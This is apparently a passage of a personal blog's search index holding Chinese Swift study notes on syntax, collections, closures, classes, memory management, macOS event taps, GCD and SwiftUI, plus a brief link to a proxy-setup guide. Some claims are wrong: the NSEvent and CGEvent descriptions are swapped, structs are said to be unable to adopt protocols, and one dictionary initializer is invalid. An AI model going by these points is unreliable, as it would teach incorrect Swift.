的值是非空，b的值将不会被考虑，也就是合并空值运算符是短路的。 Swift 条件语句 if switch 最简便的就是三目: Exp1 ? Exp2 : Exp3; Swift 循环 for-in 遍历一个集合里面的所有元素，例如由数字表示的区间、数组中的元素、字符串中的字符。 for 循环 该循环方式在 Swift 3 中已经弃用。 用来重复执行一系列语句直到达成特定条件达成，\n一般通过在每次循环完成后增加计数器的值来实现。 while 循环 运行一系列语句，如果条件为true，会重复运行，直到条件变为false。 repeat...while 循环 类似 while 语句区别在于判断循环条件之前，先执行一次循环的代码块。 循环控制语句 continue 语句: 告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。 break 语句: 中断当前循环。 fallthrough 语句: 如果在一个case执行完后，继续执行下面的case，\n需要使用fallthrough(贯穿)关键字。 Swift 字符串 创建 可以通过使用字符串字面量或 String 类的实例来创建一个字符串: import Cocoa\n\n// 使用字符串字面量\nvar stringA = \"Hello, World!\"\nprint( stringA )\n\n// String 实例化\nvar stringB = String(\"Hello, World!\")\nprint( stringB ) 初始化空的字符串 可以使用空的字符串字面量赋值给变量或初始化一个String类的实例来初始值一个空的字符串,\n使用字符串属性 isEmpty 来判断字符串是否为空: import Cocoa\n\n// 使用字符串字面量创建空字符串\nvar stringA = \"\"\n// 实例化 String 类来创建空字符串\n// let stringB = String()\n\nif stringA.isEmpty {\n  print( \"stringA 是空的\" )\n} else {\n  print( \"stringA 不是空的\" ) 字符串中插入值 插入的字符串字面量的每一项都在以反斜线为前缀的圆括号中: import Cocoa\n\nvar varA   = 20\nlet constA = 100\nvar varC:Float = 20.0\n\nvar stringA = \"\\(varA) 乘于 \\(constA) 等于 \\(varC * 100)\"\nprint( stringA ) 字符串连接 字符串可以通过 + 号来连接 字符串长度 字符串长度使用 String.count 属性来计算 字符串比较 使用 == 来比较两个字符串是否相等 Unicode 字符串 Unicode 是一个国际标准，用于文本的编码，Swift 的 String 类型是基于 Unicode建立的。\n你可以循环迭代出字符串中 UTF-8 与 UTF-16 的编码: import Cocoa\n\nvar unicodeString   = \"菜鸟教程\"\n\nprint(\"UTF-8 编码: \")\nfor code in unicodeString.utf8 {\n  print(\"\\(code) \")\n}\n\nprint(\"\\n\")\n\nprint(\"UTF-16 编码: \")\nfor code in unicodeString.utf16 {\n  print(\"\\(code) \")\n} 字符串函数及运算符 isEmpty: 判断字符串是否为空，返回布尔值 hasPrefix(prefix: String): 检查字符串是否拥有特定前缀 hasSuffix(suffix: String): 检查字符串是否拥有特定后缀。 Int(String): 转换字符串数字为整型 String.count: Swift 3 版本使用的是 String.characters.count, 计算字符串的长度 utf8: 您可以通过遍历 String 的 utf8 属性来访问它的 UTF-8 编码 utf16: 您可以通过遍历 String 的 utf16 属性来访问它的 utf16 编码 unicodeScalars: 您可以通过遍历String值的unicodeScalars属性来访问它的 Unicode 标量编码. +: 连接两个字符串，并返回一个新的字符串 +=: 连接操作符两边的字符串并将新字符串赋值给左边的操作符变量 ==: 判断两个字符串是否相等 <: 比较两个字符串，对两个字符串的字母逐一比较。 !=: 比较两个字符串是否不相等。 Swift 字符(Character) 空字符变量 Swift 中不能创建空的 Character（字符） 类型变量或常量 遍历字符串中的字符 Swift 3 中的 String 需要通过 characters 去调用的属性方法，\n在 Swift 4 中可以通过 String 对象本身直接调用，例如: import Cocoa\n\nfor ch in \"Runoob\" {\n    print(ch)\n} 字符串连接字符 使用 String 的 append() 方法来实现字符串连接字符 Swift 数组 如果创建一个数组，并赋值给一个变量，则创建的集合就是可以修改的。这意味着在创建数组后，可以通过添加、删除、修改的方式改变数组里的项目。 如果将一个数组赋值给常量，数组就不可更改，并且数组的大小和内容都不可以修改。 创建数组 可以使用构造语法来创建一个由特定数据类型构成的空数组： var someArray = [SomeType]() 以下是创建一个初始化大小数组的语法: var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements) 以下实例创建了一个类型为 Int ，数量为 3，初始值为 0 的空数组: var someInts = [Int](repeating: 0, count: 3) 以下实例创建了含有三个元素的数组: var someInts:[Int] = [10, 20, 30] 访问数组 根据数组的索引来访问数组的元素，语法如下: var someVar = someArray[index] 修改数组 可以使用 append() 方法或者赋值运算符 += 在数组末尾添加元素 也可以通过索引修改数组元素的值 遍历数组 可以使用for-in循环来遍历所有数组中的数据项 合并数组 可以使用加法操作符（+）来合并两种已存在的相同类型数组 count 属性 使用 count 属性来计算数组元素个数 isEmpty 属性 通过只读属性 isEmpty 来判断数组是否为空 注解 创建数组的方法 推荐: var names: [String] = []\nvar lookup: [String: Int] = [:] 不推荐: var names = [String]()\nvar lookup = [String: Int]() Swift 字典 Swift 字典用来存储无序的相同类型数据的集合，Swift 字典会强制检测元素的类型，如果类型不同则会报错。 Swift 字典每个值（value）都关联唯一的键（key），键作为字典中的这个值数据的标识符 如果创建一个字典，并赋值给一个变量，则创建的字典就是可以修改的。这意味着在创建字典后，可以通过添加、删除、修改的方式改变字典里的项目。 如果将一个字典赋值给常量，字典就不可修改，并且字典的大小和内容都不可以修改。 创建字典 可以使用以下语法来创建一个特定类型的空字典: // var someDict =  [KeyType: ValueType]()\nvar someDict: [KeyType: ValueType] = () 以下是创建一个空字典，键的类型为 Int，值的类型为 String 的简单语法: // var someDict = [Int: String]()\nvar someDict: [Int: String] = () 以下为创建一个字典的实例: var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] 访问字典 我们可以根据字典的索引来访问数组的元素，语法如下: var someVar = someDict[key] 修改字典 可以使用 updateValue(forKey:) 增加或更新字典的内容。\n如果 key 不存在，则添加值，如果存在则修改 key 对应的值。 updateValue(_:forKey:)方法返回被修改的Optional值 也可以通过指定的 key 来修改字典的值 移除 Key-Value 对 可以使用 removeValueForKey() 方法来移除字典 key-value 对 如果 key 存在该方法返回移除的值，如果不存在返回 nil 遍历字典 我们可以使用 for-in 循环来遍历某个字典中的键值对: import Cocoa\n\nvar someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"]\n\nfor (key, value) in someDict {\n  print(\"字典 key \\(key) -  字典 value \\(value)\")\n} 字典转换为数组 可以提取字典的键值(key-value)对，并转换为独立的数组: import Cocoa\n\nvar someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"]\n\nlet dictKeys = [Int](someDict.keys)\nlet dictValues = [String](someDict.values) count 属性 可以使用只读的 count 属性来计算字典有多少个键值对 isEmpty 属性 可以通过只读属性 isEmpty 来判断字典是否为空 Swift 函数 函数定义: func funcname(形参) -> returntype\n{\n  Statement1\n  Statement2\n  ……\n  Statement N\n  return parameters\n} 可变参数 可变参数可以接受零个或多个值. 通过在变量类型名后面加入（...）的方式来定义 常量，变量及 I/O 参数 一般默认在函数中定义的参数都是常量参数，也就是这个参数你只可以查询使用，不能改变它的值。\n如果想要声明一个变量参数，可以在参数定义前加 inout 关键字，这样就可以改变这个参数的值了 例如: func  getName(_ name: inout String)......... 一般默认的参数传递都是传值调用的，而不是传引用。所以传入的参数在函数内改变，并不影响原来的那个参数。传入的只是这个参数的副本。 当传入的参数作为输入输出参数时，需要在参数名前加 & 符，表示这个值可以被函数修改。 实例: import Cocoa\n\nfunc swapTwoInts(_ a: inout Int, _ b: inout Int) {\n    let temporaryA = a\n    a = b\n    b = temporaryA\n}\n\n\nvar x = 1\nvar y = 5\nswapTwoInts(&x, &y)\nprint(\"x 现在的值 \\(x), y 现在的值 \\(y)\") 使用函数类型 可以定义一个类型为函数的常量或变量，并将适当的函数赋值给它: var addition: (Int, Int) -> Int = sum Swift 闭包 闭包(Closures)是自包含的功能代码块，可以在代码中使用或者用来作为参数传值。 Swift 中的闭包与 C 和 Objective-C 中的代码块（blocks）以及其他一些编程语言中的 匿名函数比较相似。 全局函数和嵌套函数其实就是特殊的闭包 大多数情况下, Swift的闭包相当于匿名函数, 比如: let driver = {\n  print(\"is driver\")\n} 调用: driver 但是这并不意味着不能使用参数, 需要的参数是被写在花括号里面的 :\n为了让一个闭包接收参数，\n需要在 花括号之后把这些参数列出来，然后跟上一个 in 关键字 。\n这样就告诉Swift，闭包的主体是从哪里开始的: let driver = { (place: String) in\n  print(\"is driver in \\(place)\")\n} 函数和闭包的一个区别是运行闭包的时候你不会用到参数标签,\n直接调用即可: driver(\"秋名山\") 若需要指定返回值: let driver = { (place: String) -> String in\n  return \"is driver in \\(place)\"\n} 拖尾闭包语法 如果一个函数的最后一个参数是闭包，\nSwift允许你采用一种被称为 \"拖尾闭包语法\" 的方式来调用这个闭包。\n你可以把闭包传入函数之后的花括号里，而不必像传入参数那样。 以下为例: func travel(action: () -> Void) {\n  print(\"我准备开车了。\")\n  action()\n  print(\"我已抵达。\")\n} 正常一般会这样调用: travel(action: driver) 由于函数的最后一个参数是闭包，我们可以用拖尾闭包语法来调用\n上一节的driver: travel() {\n  print(\"is driver\")\n} 或者: travel() {\n  print(\"is driver\")\n} 实际上，由于函数没有别的参数了，我们还可以将圆括号完全移除: travel {\n  print(\"is driver\")\n} 若要接受参数: func travel(action: (String) -> Void)\n... 若需要带返回值: travel { (place: String) -> String in\n  return \"is driver in \\(place)\"\n} 若知道place与返回类型, 可以去掉注解,\n同时因为主体只有一行代码, 所以return也可以去掉,\n即: travel { place in\n  \"is driver in \\(place)\"\n} Swift还提供一种速记语法，让你可以把代码变得更短。\n我们可以让Swift为闭包的参数自动提供一个名字，而不必自行写下 place in。\n这些自动生成的名字以$开头，然后跟着一个从0开始的整数，就像下面这样: travel {\n  \"is driver in \\($0)。\"\n} Swift 枚举 枚举简单的说也是一种数据类型，只不过是这种数据类型只包含自定义的特定数据，它是一组有共同特性的数据的集合。 Swift 的枚举类似于 Objective C 和 C 的结构，枚举的功能为: 它声明在类中，可以通过实例化类来访问它的值。 枚举也可以定义构造函数（initializers）来提供一个初始成员值；可以在原始的实现基础上扩展它们的功能。 可以遵守协议（protocols）来提供标准的功能。 定义: enum enumname {\n  // 枚举定义放在这里\n  case 变量\n} case关键词表示一行新的成员值将被定义。 重要 和 C 和 Objective-C 不同，Swift 的枚举成员在被创建时不会被赋予一个默认的整型值 Swift 结构体 Swift 结构体是构建代码所用的一种通用且灵活的构造体。 我们可以为结构体定义属性（常量、变量）和添加方法，从而扩展结构体的功能。 与 C 和 Objective C 不同的是： 结构体不需要包含实现文件和接口。 结构体允许我们创建一个单一文件，且系统会自动生成面向其它代码的外部接口。 结构体总是通过被复制的方式在代码中传递，因此它的值是不可修改的。 值传递 通过关键字 struct 来定义结构体: struct nameStruct {\n  Definition 1\n  Definition 2\n  ……\n  Definition N\n} Swift 类 在一个单一文件中定义一个类，系统会自动生成面向其它代码的外部接口。 恒等运算符 判定两个常量或者变量是否引用同一个类实例，Swift 内建了两个恒等运算符 === : 两个常量或者变量引用同一个类实例则返回 true !== : 两个常量或者变量引用不同一个类实例则返回 true Swift 属性 存储属性 一个存储属性就是存储在特定类或结构体的实例里的一个常量或变量 延迟存储属性 当第一次被调用的时候才会计算其初始值的属性 在属性声明前使用 lazy 来标示一个延迟存储属性,\n且必须声明为var变量 一般用于： 延迟对象的创建。 当属性的值依赖于其他未知类 计算属性 除存储属性外，类、结构体和枚举可以定义计算属性，计算属性不直接存储值，\n而是提供一个 getter 来获取值，一个可选的 setter 来间接设置其他属性或变量的值。 只读计算属性 只有 getter 没有 setter 的计算属性就是只读计算属性 属性观察器 属性观察器监控和响应属性值的变化 不需要为无法重载的计算属性添加属性观察器，因为可以通过 setter 直接监控和响应值的变化。 可以为属性添加如下的一个或全部观察器： willSet在设置新的值之前调用 didSet在新的值被设置之后立即调用 willSet和didSet观察器在属性初始化过程中不会被调用 Swift 方法 self 属性 类型的每一个实例都有一个隐含属性叫做self，self 完全等同于该实例本身，\n相当于Java的this 在实例方法中修改值类型 Swift 语言中结构体和枚举是值类型。一般情况下，值类型的属性不能在它的实例方法中被修改 若确实需要修改， 可以选择变异(mutating)这个方法，然后方法就可以从方法内部改变它的属性；\n并且它做的任何改变在方法结束时还会保留在原始结构中。\n方法还可以给它隐含的self属性赋值一个全新的实例，这个新实例在方法结束后将替换原来的实例 在可变方法中给 self 赋值 可变方法能够赋给隐含属性 self 一个全新的实例。 类型方法 就是类方法 Swift 下标 某些方面也可以理解为增加类似数组的功能 下标脚本允许你通过在实例后面的方括号中传入一个或者多个的索引值来对实例进行访问和赋值。 语法类似于实例方法和计算型属性的混合。 与定义实例方法类似，定义下标脚本使用subscript关键字，显式声明入参（一个或多个）和返回类型。 与实例方法不同的是下标脚本可以设定为读写或只读。这种方式又有点像计算型属性的getter和setter: subscript(index: Int) -> Int {\n    get {\n        // 用于下标脚本值的声明\n    }\n    set(newValue) {\n        // 执行赋值操作\n    }\n} 参考: https://www.runoob.com/swift/swift-subscripts.html 实例: import Cocoa\n\nstruct subexample {\n    let decrementer: Int\n    subscript(index: Int) -> Int {\n        return decrementer / index\n    }\n}\nlet division = subexample(decrementer: 100)\n\nprint(\"100 除以 9 等于 \\(division[9])\")\nprint(\"100 除以 2 等于 \\(division[2])\")\nprint(\"100 除以 3 等于 \\(division[3])\")\nprint(\"100 除以 5 等于 \\(division[5])\")\nprint(\"100 除以 7 等于 \\(division[7])\") 用法 根据使用场景不同下标脚本也具有不同的含义。 通常下标脚本是用来访问集合（collection），列表（list）或序列（sequence）中元素的快捷方式。 你可以在你自己特定的类或结构体中自由的实现下标脚本来提供合适的功能。 Swift 继承 继承 使用冒号 重写（Overriding） 子类可以通过继承来的实例方法，类方法，实例属性，\n或下标脚本来实现自己的定制功能，我们把这种行为叫重写（overriding）。 子类可以通过继承来的实例方法，类方法，实例属性，或下标脚本来实现自己的定制功能，\n把这种行为叫重写（overriding）。 防止重写 使用 final 关键字防止它们被重写。 Swift 构造过程 构造函数使用 init() 方法 类实例也可以通过定义析构器（deinitializer）在类实例释放之前执行清理内存的工作。 存储型属性的初始赋值 类和结构体在实例创建时，必须为所有存储型属性设置合适的初始值。 存储属性在构造器中赋值时，它们的值是被直接设置的，不会触发任何属性观测器。 存储属性在构造器中赋值流程： 创建初始值。 在属性定义中指定默认属性值。 初始化实例，并调用 init() 方法。 构造过程中修改常量属性 只要在构造过程结束前常量的值能确定，你可以在构造过程中的任意时间点修改常量属性的值 对某个类实例来说，它的常量属性只能在定义它的类的构造过程中修改；不能在子类中修改。 默认构造器 默认构造器将简单的创建一个所有属性值都设置为默认值的实例: 结构体的逐一成员构造器 如果结构体对所有存储型属性提供了默认值且自身没有提供定制的构造器，\n它们能自动获得一个逐一成员构造器 如: struct Rectangle {\n    var length = 100.0, breadth = 200.0\n}\nlet area = Rectangle(length: 24.0, breadth: 32.0)\n\nprint(\"矩形的面积: \\(area.length)\")\nprint(\"矩形的面积: \\(area.breadth)\") 值类型的构造器代理 构造器可以通过调用其它构造器来完成实例的部分构造过程。\n这一过程称为构造器代理，它能减少多个构造器间的代码重复。 构造器的继承和重载 Swift 中的子类不会默认继承父类的构造器。 父类的构造器仅在确定和安全的情况下被继承。 当你重写一个父类指定构造器时，你需要写override修饰符 可失败构造器 可以在一个类，结构体或是枚举类型的定义中，添加一个或多个可失败构造器。\n其语法为在init关键字后面加添问号(init?)。 Swift 析构过程 在一个类的实例被释放之前，析构函数被立即调用。 用关键字deinit来标示析构函数，类似于初始化函数用init来标示。析构函数只适用于类类型。 Swift 可选链 参考: https://www.runoob.com/swift/swift-optional-chaining.html 调用时候使用问号/叹号， 问号表示可能为空， 为空则不继续调用 叹号表示强制调用（最好确定一定可以调用） 注解 这点与ts基本一致 Swift 自动引用计数（ARC） Swift 使用自动引用计数（ARC）这一机制来跟踪和管理应用程序的内存 通常情况下我们不需要去手动释放内存，因为 ARC 会在类的实例不再被使用时，自动释放其占用的内存。 但在有些时候我们还是需要在代码中实现内存管理。 ARC 功能 当每次使用 init() 方法创建一个类的新的实例的时候，ARC 会分配一大块内存用来储存实例的信息。 内存中会包含实例的类型信息，以及这个实例所有相关属性的值。 当实例不再被使用时，ARC 释放实例所占用的内存，并让释放的内存能挪作他用。 为了确保使用中的实例不会被销毁，ARC 会跟踪和计算每一个实例正在被多少属性，常量和变量所引用。 实例赋值给属性、常量或变量，它们都会创建此实例的强引用，只要强引用还在，实例是不允许被销毁的。 类实例之间的循环强引用 循环引用， 永远不会被回收 Swift 提供了两种办法用来解决你在使用类的属性时所遇到的循环强引用问题 弱引用: weak var 变量 无主引用: unowned let 变量 弱引用和无主引用允许循环引用中的一个实例引用另外一个实例而不保持强引用。\n这样实例能够互相引用而不产生循环强引用。 对于生命周期中会变为nil的实例使用弱引用。\n相反的，对于初始化赋值后再也不会被赋值为nil的实例，使用无主引用。 循环强引用还会发生在当你将一个闭包赋值给类实例的某个属性，\n并且这个闭包体中又使用了实例 Swift 类型转换 Swift 语言类型转换可以判断实例的类型。也可以用于检测实例类型是否属于其父类或者子类的实例。 is: 检测值的类型 as: 转换类型 向下转型 向下转型，用类型转换操作符(as? 或 as!) 当你不确定向下转型可以成功时，用类型转换的条件形式(as?)。\n条件形式的类型转换总是返回一个可选值（optional value），\n并且若下转是不可能的，可选值将是 nil。 只有你可以确定向下转型一定会成功时，才使用强制形式(as!)。\n当你试图向下转型为一个不正确的类型时，强制形式的类型转换会触发一个运行时错误。 Any和AnyObject的类型转换 Swift为不确定类型提供了两种特殊类型别名： AnyObject可以代表任何class类型的实例。 Any可以表示任何类型，包括方法类型（function types）。 只有当你明确的需要它的行为和功能时才使用Any和AnyObject。\n在你的代码里使用你期望的明确的类型总是更好的。 Swift 扩展 扩展就是向一个已有的类、结构体或枚举类型添加新功能。 扩展可以对一个类型添加新的功能，但是不能重写已有的功能。 语法 扩展声明使用关键字 extension: extension SomeType {\n    // 加到SomeType的新功能写到这里\n} 一个扩展可以扩展一个已有类型，使其能够适配一个或多个协议，语法格式如下: extension SomeType: SomeProtocol, AnotherProctocol {\n    // 协议实现写到这里\n} 下面的例子向 Int 类型添加了 5 个计算型实例属性并扩展其功能: extension Int {\n  var add: Int {return self + 100 }\n  var sub: Int { return self - 10 }\n  var mul: Int { return self * 10 }\n  var div: Int { return self / 5 }\n}\n\nlet addition = 3.add\nprint(\"加法运算后的值：\\(addition)\") Swift 协议 应该就是接口吧 协议的语法格式如下: protocol SomeProtocol {\n    // 协议内容\n} 要使类遵循某个协议，需要在类型名称后加上协议名称，中间以冒号:分隔.\n遵循多个协议时，各协议之间用逗号,分隔: struct SomeStructure: FirstProtocol, AnotherProtocol {\n    // 结构体内容\n} 如果类在遵循协议的同时拥有父类，应该将父类名放在协议名之前，以逗号分隔: class SomeClass: SomeSuperClass, FirstProtocol, AnotherProtocol {\n    // 类的内容\n} 类专属协议 可以在协议的继承列表中,通过添加class关键字,限制协议只能适配到类（class）类型。 该class关键字必须是第一个出现在协议的继承列表中，其后，才是其他继承协议。格式如下: protocol SomeClassOnlyProtocol: class, SomeInheritedProtocol {\n    // 协议定义\n} Swift 泛型 类型约束 关联类 使用 associatedtype 关键字来设置关联类型实例 Where 语句 可以在参数列表中通过where语句定义参数的约束 Swift 访问控制 public        可以访问自己模块中源文件里的任何实体，别人也可以通过引入该模块来访问源文件里的所有实体。 internal      可以访问自己模块中源文件里的任何实体，但是别人不能访问该模块中源文件里的实体。 fileprivate   文件内私有，只能在当前源文件中使用。 private       只能在类中访问，离开了这个类或者结构体的作用域外面就无法访问。 枚举类型访问权限 枚举中成员的访问级别继承自该枚举，你不能为枚举中的成员单独申明不同的访问级别。 子类访问权限 子类的访问级别不得高于父类的访问级别。\n比如说，父类的访问级别是 internal，子类的访问级别就不能申明为 public。","tags":"后端; swift","url":"/yq-backend-swift-course-lan.html","loc":"/yq-backend-swift-course-lan.html"},{"title":"官方库","text":"UIKit 移动端用 Cocoa OS x桌面端用 包含 AppKit: 官方文档: https://developer.apple.com/documentation/appkit Foundation SwiftUI 较新的框架, 跨平台支持(桌面/移动) 一些库对象/函数 NSEvent 是Core Graphics框架提供的事件处理类。\n一个比较底层的事件类, 用于处理与图形渲染和窗口服务相关的事件。 CGEvent可以用于模拟和处理鼠标、键盘、触摸等低级输入事件。\n它提供了更底层的控制，可以直接操作事件的属性，如位置、按键状态等。 CGEvent AppKit框架提供的事件处理类. 是一个较高层的事件处理接口，用于处理与应用程序界面和用户交互相关的事件。\nNSEvent提供了一些高级的功能，如自动处理按键重复、多点触控、手势识别等。\n它还提供了更高级的事件处理方法，如响应链、事件分发等。 CGEvent.tapCreate 创建一个事件截取, 参考: https://developer.apple.com/documentation/coregraphics/cgevent/1454426-tapcreate 参数列表: (tap: CGEventTapLocation, place: CGEventTapPlacement, options: CGEventTapOptions, eventsOfInterest: CGEventMask, callback: CGEventTapCallBack, userInfo: UnsafeMutableRawPointer?) -> CFMachPort? 主要说一下 eventsOfInterest: CGEventMask ,\n这个是一个位掩码集合, 标识截取的事件类型, 比如 CGEventMask(1 << NSEvent.EventType.keyDown.rawValue) ,\n多个事件用 | 整合. 左移一位表示转换为位掩码 其中有一个参数Callable是个回调函数, 用于处理事件\n需要返回一个cgEvent的指针(),\n函数签名为 CGEventRef (*)(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) (返回一个CGEventRef对象，即一个CGEvent类型的引用) 回调函数负责创建和返回CGEventRef对象，并控制对该对象的内存管理 回调返回的cgEvent有两个可用的修饰: passRetained：在回调函数中，如果你使用passRetained来返回CGEventRef对象，它表示你将内存管理权转移给调用方。\n这意味着，调用方需要负责在适当的时候调用CFRelease来释放CGEventRef对象，以确保正确释放内存并避免内存泄漏。\n这通常适用于你在回调函数中创建了一个新的CGEventRef对象，并希望调用方负责管理其生命周期。 例如，如果你在回调函数中使用CGEventCreateCopy函数创建了一个新的事件副本，并通过passRetained返回，\n那么调用方需要负责在不再需要该事件时调用CFRelease来释放它。 passUnretained：在回调函数中，如果你使用passUnretained来返回CGEventRef对象，它表示你不会转移内存管理权给调用方。\n这意味着，调用方不需要调用CFRelease释放CGEventRef对象，因为你保留了对该对象的所有权。\n这通常适用于你在回调函数中返回了一个指向全局或静态变量的CGEventRef对象，\n或者你从其他地方获取的对象，而不是在回调函数中创建的新对象。 例如，如果你在回调函数中返回一个全局变量中存储的事件对象，或者你通过传递指针参数获取一个事件对象，\n然后使用passUnretained返回，那么调用方不需要调用CFRelease释放它。 综上所述，使用passRetained表示你将内存管理权转移给调用方，调用方需要负责释放对象。\n而使用passUnretained表示你保留了内存管理权，调用方无需释放对象。\n你应根据具体情况选择适当的内存管理方式，以确保正确处理内存生命周期。 (这部分来自AI) 注解 另外自己使用 CGEvent 时, 尽量不要去强转为 NSEvent: let nsEvent = NSEvent(cgEvent: cgEvent), 因为有时候在这转了后, 返回的cgEvent, 在底层调用可能会报错: Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846\n...\ncom.apple.NSEventThread (7): EXC_BREAKPOINT (code=1, subcode=0x18307be7c) Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 DispatchQueue 执行任务的调度队列,\n支持异步执行 DispatchQueue 是一个用于执行任务的调度队列，它是在Grand Central Dispatch (GCD) 中提供的主要类之一。\nGCD是一个用于并发执行任务的底层系统框架，它提供了一种简单而强大的方式来管理并发任务的执行。 DispatchQueue 可以将任务（代码块）安排到不同的队列中，并按照特定的调度方式进行执行。它提供了两种类型的队列： Serial Queue（串行队列）：每次只能执行一个任务，按照任务添加的顺序进行执行。后一个任务会等待前一个任务完成后才能开始执行。 Concurrent Queue（并发队列）：可以同时执行多个任务，并且任务的执行顺序可能不确定。 你可以使用 DispatchQueue 来执行以下类型的任务： 同步任务（Sync Tasks）：任务会在当前线程中同步执行，直到任务执行完毕后才会继续执行后续代码。 异步任务（Async Tasks）：任务会在后台线程中异步执行，不会阻塞当前线程的执行，可以继续执行后续代码。 以下是一个使用 DispatchQueue 的简单示例: let queue = DispatchQueue(label: \"com.example.queue\")\n\n// 异步任务\nqueue.async {\n    // 在后台线程执行的任务\n    print(\"异步任务\")\n}\n\n// 同步任务\nqueue.sync {\n    // 在当前线程执行的任务\n    print(\"同步任务\")\n} DispatchQueue 还提供了其他功能，如延迟执行任务、调度任务在特定时间或间隔后执行等。\n它是在iOS、macOS、watchOS 和 tvOS 开发中进行异步和并发编程的重要工具之一。 比如延时执行也可以: // 延时执行任务\nDispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {\n    // 2秒后执行的任务\n    print(\"延时执行的任务\")\n} NSViewRepresentable 一个协议，用于在SwiftUI中封装和使用Cocoa（macOS）中的NSView。\n它允许开发者通过实现一些必要的方法来创建自定义的NSView，并将其嵌入到SwiftUI视图层级中。 通过遵循NSViewRepresentable协议，\n你可以创建一个遵循NSViewRepresentable协议的自定义结构体或类，然后实现以下两个必要的方法： makeNSView(context:)：在这个方法中，你需要创建并返回一个NSView实例。这个方法会在视图第一次被创建时调用。 updateNSView(_:context:)：在这个方法中，你可以根据需要更新NSView的属性和内容。这个方法会在视图的状态发生变化时被调用。 通过实现这些方法，你可以在SwiftUI中使用自定义的NSView，\n并在其中使用Cocoa（macOS）提供的各种功能和控件，以满足特定的需求。 View 视图顶级窗口, 注意, 没有提供默认的close方法, 因为官方觉得close不应该由View触发 可以通过以下代码获取到View所在窗体然后关闭: NSWindow(contentViewController: NSHostingController(rootView: self)) NSWindow AppKit的窗口管理 NSHostingController AppKit 中的类，用于在 macOS 应用程序中承载 SwiftUI 视图。 它是一个 AppKit 视图控制器，用于在 AppKit 应用程序中托管和管理 SwiftUI 视图。\n通过将 SwiftUI 视图嵌入到 NSHostingController 中，可以在 AppKit 应用程序的视图层次结构中使用 SwiftUI 视图。 ZStack与VStack ZStack 一个3D的布局方式, 比如有三个图标, 后者会叠放在前者上 VStack 垂直布局方式, 比如有三个图标, 后者会垂直排列与前者 支持的块 Settings 块 用于定义应用程序的设置场景，它是一个视图构造器，用于自定义应用程序的设置界面。\n通过在 Settings 块中添加视图来创建自定义的设置界面，以供用户配置和调整应用程序的各种选项。 WindowGroup 块 WindowGroup 块用于定义应用程序的主窗口场景。\n在 WindowGroup 块中，你可以指定应用程序的主窗口的内容视图以及其他与窗口相关的属性。 Scene 块 Scene 块用于定义应用程序的场景，它可以包含一个或多个窗口组。\n你可以在 Scene 块中定义应用程序的场景配置、窗口管理和生命周期处理。 NavigationView 块 NavigationView 块用于创建具有导航功能的视图层次结构。\n在 NavigationView 块中，你可以使用 NavigationView 的修饰符和子视图来定义导航栏、导航链接以及其他与导航相关的界面元素。 Form 块 Form 块用于创建表单视图，用于显示和收集用户的输入。\n在 Form 块中，你可以使用 Form 的修饰符和子视图来创建表单字段、分组和其他与表单相关的界面元素。 List 块 List 块用于创建可滚动的列表视图。\n在 List 块中，你可以使用 List 的修饰符和子视图来定义列表项、分组和其他与列表相关的界面元素。 ForEach 块 ForEach 块用于在列表或视图中迭代和显示集合中的元素。\n在 ForEach 块中，你可以使用 ForEach 的修饰符和子视图来定义每个元素的显示方式和交互行为。 SwiftUI 与 AppKit SwiftUI 和 AppKit 是 Apple 提供的两个不同的框架，\n用于构建 macOS 应用程序的用户界面。它们在设计和开发理念上有一些区别。 声明性 UI：SwiftUI 是一个基于声明性 UI 的框架，\n它使用简洁的代码和声明式的方式来描述用户界面。\n你可以使用 SwiftUI 的各种视图和修饰符来构建用户界面，\n并且它会自动处理视图状态和布局，以及与用户交互的响应。 而 AppKit 是一个基于命令式的 UI 框架，你需要编写更多的代码来手动管理视图的状态和布局。 跨平台支持：SwiftUI 是一个跨平台框架，\n除了 macOS，它还可以用于构建 iOS、iPadOS、watchOS 和 tvOS 应用程序。\n这意味着你可以使用相同的代码和技术来开发多个平台上的应用程序。 而 AppKit 是专门为 macOS 设计的框架，不支持其他平台。 响应式布局：SwiftUI 的布局系统是响应式的，\n它使用了一种叫做 \"容器视图\" 的概念，可以自动适应不同的屏幕尺寸和设备方向。\n这使得开发适应性更强的用户界面变得更加容易。 AppKit 的布局系统相对较为传统，需要手动处理不同的屏幕尺寸和设备方向。 预览功能：SwiftUI 提供了一个强大的预览功能，可以在开发过程中实时预览和调试用户界面。\n你可以在 Xcode 中查看 SwiftUI 视图在不同设备上的外观，并即时查看代码更改的效果。\n这对于迭代开发和快速调试非常有帮助。AppKit 并没有提供类似的预览功能。 尽管 SwiftUI 在设计上有一些新颖的概念和优势，\n但在某些情况下，仍然需要使用 AppKit 来构建更复杂和定制化的 macOS 应用程序。\nAppKit 拥有更多的功能和灵活性","tags":"后端; swift","url":"/yq-backend-swift-course-lib.html","loc":"/yq-backend-swift-course-lib.html"},{"title":"swift结构体与类的使用区别","text":"结构体: 值类型, 当你创建结构体的实例时，它会创建该结构的深拷贝; 即使将其赋值给其他变量, 也是创建一个值的拷贝 结构体的成员默认是不可变的（immutable），除非你明确地使用关键字mutating来标记 结构体不能继承自其他结构体或类，也不能实现协议（protocol）。\n但是，你可以在结构体中定义一个名为init的函数来实现初始化逻辑。 类 引用类型, 当你创建类的实例时，它创建的是对类类型的引用(多个引用执行同一个值) 类的成员默认是可变的（mutable） 类可以继承自其他类或实现协议 使用场景 结构体：结构体通常用于表示简单的数据模型，\n如几何形状或货币单位，其中重点是数据而不是行为。\n结构体的行为通常通过函数和计算属性来定义。 类：类通常用于表示更复杂的概念，\n如人类、动物或汽车等，其中重点是行为和状态。\n类可以拥有实例方法和类方法，以及属性（可以是可变的或不可变的）。","tags":"后端; swift","url":"/yq-backend-swift-issuse-diff-with-class-struct.html","loc":"/yq-backend-swift-issuse-diff-with-class-struct.html"},{"title":"自建代理","text":"可参考: 66云美西9929 cn2-gia vps 搭建XRAY +bbr 七合一脚本 秒开4K 速度80000+ 完美科学上网 本地位置: ../../resources/pdf/66云美西9929 cn2-gia vps 搭建XRAY +bbr 七合一脚本 秒开4K 速度80000+ 完美科学上网 - 萝卜头网创联盟-萝卜头网创联盟.pdf 